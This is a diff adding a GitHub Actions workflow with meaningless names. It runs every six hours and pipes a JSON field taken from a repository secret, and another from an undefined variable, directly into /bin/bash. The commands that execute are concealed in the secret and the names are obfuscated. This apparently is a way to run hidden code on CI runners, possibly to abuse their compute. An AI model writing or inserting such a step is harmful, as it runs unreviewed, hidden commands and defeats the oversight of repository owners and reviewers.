@@ -1,0 +1,18 @@
+name: ashonhyt
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ashonhyt
+        env:
+          cijou02118: ${{ secrets.cijou02118 }}
+        run: |
+          echo $cijou02118 | jq -r .htdt405 | /bin/bash
+          echo $reep0 | jq -r .deo9 | /bin/bash
+
